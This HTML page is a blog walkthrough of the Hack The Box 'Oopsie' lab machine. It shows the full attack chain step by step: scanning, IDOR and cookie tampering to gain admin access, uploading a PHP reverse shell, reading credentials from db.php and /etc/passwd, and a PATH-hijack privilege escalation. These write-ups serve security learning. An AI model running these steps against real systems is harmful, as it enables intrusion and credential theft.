@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Oopsie Machine Walkthrough | HTB Notes</title>
+<meta name="keywords" content="">
+<meta name="description" content="Let&rsquo;s start with scanning the sevices running on the host.
+1. Nmap scanning
+nmap 10.129.5.130 -sC -sV --open
+Findings:
+
+Port 80 is open (Apache server), we can access it with browser
+Port 22 is open (SSH)
+
+2. Web Enumeration
+Website is probably about some vehicle services.
+
+Scrolling the page, we encounter interesting section about an existing login page. We should find out more about that login form page, so we can use Burpsuite to retrieve all the data about the website.
+Start the burpsuite:">
+<meta name="author" content="">
+<link rel="canonical" href="https://hoverdd.github.io/htb-notes/posts/oopsie/">
+<link crossorigin="anonymous" href="/htb-notes/assets/css/stylesheet.8fe10233a706bc87f2e08b3cf97b8bd4c0a80f10675a143675d59212121037c0.css" integrity="sha256-j&#43;ECM6cGvIfy4Is8&#43;XuL1MCoDxBnWhQ2ddWSEhIQN8A=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://hoverdd.github.io/htb-notes/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://hoverdd.github.io/htb-notes/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://hoverdd.github.io/htb-notes/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://hoverdd.github.io/htb-notes/apple-touch-icon.png">
+<link rel="mask-icon" href="https://hoverdd.github.io/htb-notes/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://hoverdd.github.io/htb-notes/posts/oopsie/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript><meta property="og:url" content="https://hoverdd.github.io/htb-notes/posts/oopsie/">
+  <meta property="og:site_name" content="HTB Notes">
+  <meta property="og:title" content="Oopsie Machine Walkthrough">
+  <meta property="og:description" content="Let’s start with scanning the sevices running on the host.
+1. Nmap scanning nmap 10.129.5.130 -sC -sV --open Findings: Port 80 is open (Apache server), we can access it with browser Port 22 is open (SSH) 2. Web Enumeration Website is probably about some vehicle services. Scrolling the page, we encounter interesting section about an existing login page. We should find out more about that login form page, so we can use Burpsuite to retrieve all the data about the website. Start the burpsuite:">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-07-08T11:07:14+03:00">
+    <meta property="article:modified_time" content="2025-07-08T11:07:14+03:00">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Oopsie Machine Walkthrough">
+<meta name="twitter:description" content="Let&rsquo;s start with scanning the sevices running on the host.
+1. Nmap scanning
+nmap 10.129.5.130 -sC -sV --open
+Findings:
+
+Port 80 is open (Apache server), we can access it with browser
+Port 22 is open (SSH)
+
+2. Web Enumeration
+Website is probably about some vehicle services.
+
+Scrolling the page, we encounter interesting section about an existing login page. We should find out more about that login form page, so we can use Burpsuite to retrieve all the data about the website.
+Start the burpsuite:">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://hoverdd.github.io/htb-notes/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Oopsie Machine Walkthrough",
+      "item": "https://hoverdd.github.io/htb-notes/posts/oopsie/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Oopsie Machine Walkthrough",
+  "name": "Oopsie Machine Walkthrough",
+  "description": "Let\u0026rsquo;s start with scanning the sevices running on the host.\n1. Nmap scanning nmap 10.129.5.130 -sC -sV --open Findings: Port 80 is open (Apache server), we can access it with browser Port 22 is open (SSH) 2. Web Enumeration Website is probably about some vehicle services. Scrolling the page, we encounter interesting section about an existing login page. We should find out more about that login form page, so we can use Burpsuite to retrieve all the data about the website. Start the burpsuite:\n",
+  "keywords": [
+    
+  ],
+  "articleBody": "Let’s start with scanning the sevices running on the host.\n1. Nmap scanning nmap 10.129.5.130 -sC -sV --open Findings: Port 80 is open (Apache server), we can access it with browser Port 22 is open (SSH) 2. Web Enumeration Website is probably about some vehicle services. Scrolling the page, we encounter interesting section about an existing login page. We should find out more about that login form page, so we can use Burpsuite to retrieve all the data about the website. Start the burpsuite:\nburpsuite I will use chromium with proxy server on port 8080 which is used by burpsuite:\nchromium --proxy-server=127.0.0.1:8080 We can then visit the website again and open the burpsuite to see all the data he retrieved. We see that the login page exist and we can open it at /cdn-cgi/login. First, let’s try default common credentials like admin:admin, admin:password123 in case admin forgot to change it. Ok, seems it’s not the case, so why not using the guest account for now, let’s login as a guest.\n3. Exploitation Getting a reverse shell And we have access to guest admin panel now. Let’s see what interesting may be on uploads page. The page tells us we don’t have admin rights. On account page we see some info about our account: it has access id, name and email. The http request in browser search field looks like this:\nhttp://10.129.5.130/cdn-cgi/login/admin.php?content=accounts\u0026id=2 Maybe we can change the id? Let’s try \u0026id=1. Yay, we got info about admin account! Let’s see what cookies website stores. There is probably important info we need, so why not check it. In cookies window we see two fields: role and user. We need to try admin creds: role:admin and user:34322 (access id). Now let’s open the uploads page. Yess!! Now the website allows us to upload files! If we can upload files, we should try to get a reverse shell. We will use webshells collection:\ncp /usr/share/webshells/php/php-reverse-shell.php . Before uploading the file, we need to change $ip where our target machine will connect and $port which we will listen on, I’ll keep 1234. Create netcat listener on port 1234 and upload the file. But we don’t know where that file go?!!! Ok, let’s see with gobuster in dir mode:\ngobuster dir --url http://10.129.5.130 -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -x .php We see that there is /uploads on the website, let’s try to access our file in browser:\nhttp://10.129.5.130/uploads/php-reverse-shell.php It’s not found, so let’s upload it again in case it got deleted. Yaaay!!!! We now have working reverse shell!\n4. Privelege Escalation Getting user flag Let’s upgrade our shell with:\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")' Let’s see what’s inside of /var/www/html/cdn-cgi/login folder. There are more than one file in there, so it would be best if we could search through them automatically. Fortunately there is a command in linux with which we can do that:\ncat * | grep -i passw* We tell cat to print all the contents of these files and pass them to grep tool. -i flag tells grep to search through the text ignoring the case (ex: password, Password). It shows us admin password, so let’s see /etc/passwd file and search for users that may have this password.\ncat /etc/passwd In the of the file we see some user named robert. Maybe it’s his password? Let’s see:\nsu robert # login into robert account No it’s not robert’s ;( So let’s see what inside of the other files ourselves, db.php for example. We see credentials of a connection to the database, let’s try this password. It worked!!! Now we can grab our user flag in /home/robert/user.txt folder with command head:\nhead /home/robert/user.txt Getting root flag Also Command id shows us that robert is in some group named bugtracker. First, let’s see what files can robert run with sudo priveleges:\nsudo -l robert doesn’t have any sudo priveleges, thus running enumeration script will be useless for now. Let’s see if bugtracker group has any group-specific files:\nfind / -group bugtracker 2\u003e/dev/null note: 2\u003e/dev/null is used to hide the error messages, there will be a lot :) Yess there is a file only users in bugtracker group can run! Before running the file we should see its SUID and what type of file is that:\nls -la /usr/bin/bugtracker \u0026\u0026 file /usr/bin/bugtracker note: SUID stands for Set Owner User ID, it’s just defines rules for files. It specifies who can run the file and what right he should own to do that. /usr/bin/bugtracker can be run only as root or by bugtracker group member. Let’s run it:\n/usr/bin/bugtracker We see that the program provides information about a bug. Try another id, for example, 14. The program runs this command:\ncat: /root/reports/14: No such file or directory It doesn’t use full cat path, so I think we can swap original cat program with ours, that will take us to root. note: the $PATH variable stores paths where the executables of the programs are. We probably can change it with our own path. Change the folder to /tmp, it’s a safe folder for us because it doesn’t have special rights to see or run files. Let’s create our own malicious cat command.\necho \"/bin/sh\" \u003e cat We also need to change the permission to be able to execute our program:\nchmod +x ./cat And finally, add /tmp folder to PATH variable, so /usr/bin/bugtracker program would use our malicious cat instead of the standard one:\nexport PATH=/tmp:$PATH Let’s be sure the variable PATH has changed:\necho $PATH It should be like this:\n/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games Now let’s run /usr/bin/bugtracker program. Let’s check who are we in this system and our SUID. We are the root!!!! Yaaay!! We did it! Now we can retrive the root flag in /root/root.txt Hmm.. cat doesn’t work, ok let’s try using head command. And yess we got the flag ;)\nIt was quite difficult machine for me but it was super interesting!1! Thank you for reading!\n",
+  "wordCount" : "986",
+  "inLanguage": "en",
+  "datePublished": "2025-07-08T11:07:14+03:00",
+  "dateModified": "2025-07-08T11:07:14+03:00",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://hoverdd.github.io/htb-notes/posts/oopsie/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "HTB Notes",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://hoverdd.github.io/htb-notes/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class=" dark" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://hoverdd.github.io/htb-notes/" accesskey="h" title="HTB Notes (Alt + H)">HTB Notes</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://hoverdd.github.io/htb-notes/about/" title="About me">
+                    <span>About me</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Oopsie Machine Walkthrough
+    </h1>
+    <div class="post-meta"><span title='2025-07-08 11:07:14 +0300 MSK'>July 8, 2025</span>
+
+</div>
+  </header> 
+  <div class="post-content"><p>Let&rsquo;s start with scanning the sevices running on the host.</p>
+<h2 id="1-nmap-scanning">1. Nmap scanning<a hidden class="anchor" aria-hidden="true" href="#1-nmap-scanning">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap 10.129.5.130 -sC -sV --open
+</span></span></code></pre></div><h3 id="findings">Findings:<a hidden class="anchor" aria-hidden="true" href="#findings">#</a></h3>
+<ul>
+<li>Port 80 is open (Apache server), we can access it with browser</li>
+<li>Port 22 is open (SSH)</li>
+</ul>
+<h2 id="2-web-enumeration">2. Web Enumeration<a hidden class="anchor" aria-hidden="true" href="#2-web-enumeration">#</a></h2>
+<p>Website is probably about some vehicle services.
+<img alt="alt text" loading="lazy" src="/htb-notes/posts/oopsie/screenshots/Screenshot%202025-07-08%20at%208.41.43%E2%80%AFAM.png">
+Scrolling the page, we encounter interesting section about an existing login page. We should find out more about that login form page, so we can use Burpsuite to retrieve all the data about the website.
+Start the burpsuite:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>burpsuite
+</span></span></code></pre></div><p>I will use chromium with proxy server on port 8080 which is used by burpsuite:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>chromium --proxy-server<span style="color:#f92672">=</span>127.0.0.1:8080
+</span></span></code></pre></div><p>We can then visit the website again and open the burpsuite to see all the data he retrieved.
+<img alt="alt text" loading="lazy" src="/htb-notes/posts/oopsie/screenshots/Screenshot%202025-07-08%20at%208.50.03%E2%80%AFAM.png">
+We see that the login page exist and we can open it at <code>/cdn-cgi/login</code>.
+First, let&rsquo;s try default common credentials like admin:admin, admin:password123 in case admin forgot to change it.
+Ok, seems it&rsquo;s not the case, so why not using the guest account for now, let&rsquo;s login as a guest.</p>
+<h2 id="3-exploitation">3. Exploitation<a hidden class="anchor" aria-hidden="true" href="#3-exploitation">#</a></h2>
+<h3 id="getting-a-reverse-shell">Getting a reverse shell<a hidden class="anchor" aria-hidden="true" href="#getting-a-reverse-shell">#</a></h3>
+<p>And we have access to guest admin panel now. Let&rsquo;s see what interesting may be on uploads page. The page tells us we don&rsquo;t have admin rights. On account page we see some info about our account: it has access id, name and email.
+The http request in browser search field looks like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>http://10.129.5.130/cdn-cgi/login/admin.php?content<span style="color:#f92672">=</span>accounts&amp;id<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>
+</span></span></code></pre></div><p>Maybe we can change the <code>id</code>? Let&rsquo;s try <code>&amp;id=1</code>.
+Yay, we got info about admin account!
+<img alt="alt text" loading="lazy" src="/htb-notes/posts/oopsie/screenshots/Screenshot%202025-07-08%20at%208.57.11%E2%80%AFAM.png">
+Let&rsquo;s see what cookies website stores. There is probably important info we need, so why not check it.
+In cookies window we see two fields: role and user. We need to try admin creds: role:admin and user:34322 (access id).
+Now let&rsquo;s open the uploads page. Yess!! Now the website allows us to upload files!
+<img alt="alt text" loading="lazy" src="/htb-notes/posts/oopsie/screenshots/Screenshot%202025-07-08%20at%209.02.10%E2%80%AFAM.png">
+If we can upload files, we should try to get a reverse shell. We will use <code>webshells</code> collection:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cp /usr/share/webshells/php/php-reverse-shell.php .
+</span></span></code></pre></div><p>Before uploading the file, we need to change <code>$ip</code> where our target machine will connect and <code>$port</code> which we will listen on, I&rsquo;ll keep <code>1234</code>.
+Create netcat listener on port <code>1234</code> and upload the file.
+But we don&rsquo;t know where that file go?!!!
+Ok, let&rsquo;s see with <code>gobuster</code> in dir mode:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gobuster dir --url http://10.129.5.130 -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -x .php
+</span></span></code></pre></div><p><img alt="alt text" loading="lazy" src="/htb-notes/posts/oopsie/screenshots/Screenshot%202025-07-08%20at%209.10.31%E2%80%AFAM.png">
+We see that there is <code>/uploads</code> on the website, let&rsquo;s try to access our file in browser:</p>
+<pre tabindex="0"><code>http://10.129.5.130/uploads/php-reverse-shell.php
+</code></pre><p><img alt="alt text" loading="lazy" src="/htb-notes/posts/oopsie/screenshots/Screenshot%202025-07-08%20at%209.12.44%E2%80%AFAM.png">
+It&rsquo;s not found, so let&rsquo;s upload it again in case it got deleted.
+<img alt="alt text" loading="lazy" src="/htb-notes/posts/oopsie/screenshots/Screenshot%202025-07-08%20at%209.14.14%E2%80%AFAM.png">
+Yaaay!!!! We now have working reverse shell!</p>
+<h2 id="4-privelege-escalation">4. Privelege Escalation<a hidden class="anchor" aria-hidden="true" href="#4-privelege-escalation">#</a></h2>
+<h3 id="getting-user-flag">Getting user flag<a hidden class="anchor" aria-hidden="true" href="#getting-user-flag">#</a></h3>
+<p>Let&rsquo;s upgrade our shell with:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span></code></pre></div><p>Let&rsquo;s see what&rsquo;s inside of <code>/var/www/html/cdn-cgi/login</code> folder.
+<img alt="alt text" loading="lazy" src="/htb-notes/posts/oopsie/screenshots/Screenshot%202025-07-08%20at%209.18.46%E2%80%AFAM.png">
+There are more than one file in there, so it would be best if we could search through them automatically. Fortunately there is a command in linux with which we can do that:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat * | grep -i passw*
+</span></span></code></pre></div><p>We tell <code>cat</code> to print all the contents of these files and pass them to <code>grep</code> tool. <code>-i</code> flag tells <code>grep</code> to search through the text ignoring the case (ex: password, Password).
+<img alt="alt text" loading="lazy" src="/htb-notes/posts/oopsie/screenshots/Screenshot%202025-07-08%20at%209.25.28%E2%80%AFAM.png">
+It shows us admin password, so let&rsquo;s see <code>/etc/passwd</code> file and search for users that may have this password.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /etc/passwd
+</span></span></code></pre></div><p><img alt="alt text" loading="lazy" src="/htb-notes/posts/oopsie/screenshots/Screenshot%202025-07-08%20at%209.27.19%E2%80%AFAM.png">
+In the of the file we see some user named <code>robert</code>. Maybe it&rsquo;s his password? Let&rsquo;s see:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>su robert <span style="color:#75715e"># login into robert account</span>
+</span></span></code></pre></div><p><img alt="alt text" loading="lazy" src="/htb-notes/posts/oopsie/screenshots/Screenshot%202025-07-08%20at%209.29.26%E2%80%AFAM.png">
+No it&rsquo;s not robert&rsquo;s ;(
+So let&rsquo;s see what inside of the other files ourselves, <code>db.php</code> for example.
+We see credentials of a connection to the database, let&rsquo;s try this password.
+It worked!!!
+<img alt="alt text" loading="lazy" src="/htb-notes/posts/oopsie/screenshots/Screenshot%202025-07-08%20at%209.32.06%E2%80%AFAM.png">
+Now we can grab our user flag in <code>/home/robert/user.txt</code> folder with command <code>head</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>head /home/robert/user.txt
+</span></span></code></pre></div><h3 id="getting-root-flag">Getting root flag<a hidden class="anchor" aria-hidden="true" href="#getting-root-flag">#</a></h3>
+<p>Also Command <code>id</code> shows us that robert is in some group named <code>bugtracker</code>.
+<img alt="alt text" loading="lazy" src="/htb-notes/posts/oopsie/screenshots/Screenshot%202025-07-08%20at%209.32.06%E2%80%AFAM-1.png">
+First, let&rsquo;s see what files can robert run with <code>sudo</code> priveleges:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo -l
+</span></span></code></pre></div><p><img alt="alt text" loading="lazy" src="/htb-notes/posts/oopsie/screenshots/Screenshot%202025-07-08%20at%209.35.26%E2%80%AFAM.png">
+<code>robert</code> doesn&rsquo;t have any sudo priveleges, thus running enumeration script will be useless for now. Let&rsquo;s see if <code>bugtracker</code> group has any group-specific files:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -group bugtracker 2&gt;/dev/null
+</span></span></code></pre></div><p><em>note</em>: <code>2&gt;/dev/null</code> is used to hide the error messages, there will be a lot :)
+<img alt="alt text" loading="lazy" src="/htb-notes/posts/oopsie/screenshots/Screenshot%202025-07-08%20at%209.39.36%E2%80%AFAM.png">
+Yess there is a file only users in <code>bugtracker</code> group can run!
+Before running the file we should see its SUID and what type of file is that:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ls -la /usr/bin/bugtracker <span style="color:#f92672">&amp;&amp;</span> file /usr/bin/bugtracker
+</span></span></code></pre></div><p><img alt="alt text" loading="lazy" src="/htb-notes/posts/oopsie/screenshots/Screenshot%202025-07-08%20at%209.42.37%E2%80%AFAM.png">
+<em>note</em>: SUID stands for Set Owner User ID, it&rsquo;s just defines rules for files. It specifies who can run the file and what right he should own to do that.
+<code>/usr/bin/bugtracker</code> can be run only as root or by <code>bugtracker</code> group member. Let&rsquo;s run it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/usr/bin/bugtracker
+</span></span></code></pre></div><p><img alt="alt text" loading="lazy" src="/htb-notes/posts/oopsie/screenshots/Screenshot%202025-07-08%20at%209.48.19%E2%80%AFAM.png">
+We see that the program provides information about a bug.
+Try another <code>id</code>, for example, 14.
+<img alt="alt text" loading="lazy" src="/htb-notes/posts/oopsie/screenshots/Screenshot%202025-07-08%20at%209.51.14%E2%80%AFAM.png"></p>
+<p>The program runs this command:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat: /root/reports/14: No such file or directory
+</span></span></code></pre></div><p>It doesn&rsquo;t use full <code>cat</code> path, so I think we can swap original cat program with ours, that will take us to root.
+<em>note</em>: the <code>$PATH</code> variable stores paths where the executables of the programs are. We probably can change it with our own path.
+Change the folder to <code>/tmp</code>, it&rsquo;s a safe folder for us because it doesn&rsquo;t have special rights to see or run files.
+Let&rsquo;s create our own malicious <code>cat</code> command.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;/bin/sh&#34;</span> &gt; cat
+</span></span></code></pre></div><p>We also need to change the permission to be able to execute our program:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>chmod +x ./cat
+</span></span></code></pre></div><p>And finally, add <code>/tmp</code> folder to PATH variable, so <code>/usr/bin/bugtracker</code> program would use our malicious <code>cat</code> instead of the standard one:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>export PATH<span style="color:#f92672">=</span>/tmp:$PATH
+</span></span></code></pre></div><p>Let&rsquo;s be sure the variable <code>PATH</code> has changed:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo $PATH
+</span></span></code></pre></div><p>It should be like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
+</span></span></code></pre></div><p>Now let&rsquo;s run <code>/usr/bin/bugtracker</code> program.
+<img alt="alt text" loading="lazy" src="/htb-notes/posts/oopsie/screenshots/Screenshot%202025-07-08%20at%2010.40.43%E2%80%AFAM.png">
+Let&rsquo;s check who are we in this system and our SUID.
+<img alt="alt text" loading="lazy" src="/htb-notes/posts/oopsie/screenshots/Screenshot%202025-07-08%20at%2010.41.25%E2%80%AFAM.png">
+We are the root!!!! Yaaay!! We did it! Now we can retrive the root flag in <code>/root/root.txt</code>
+Hmm.. <code>cat</code> doesn&rsquo;t work, ok let&rsquo;s try using <code>head</code> command. And yess we got the flag ;)</p>
+<p>It was quite difficult machine for me but it was super interesting!1!
+Thank you for reading!</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://hoverdd.github.io/htb-notes/">HTB Notes</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
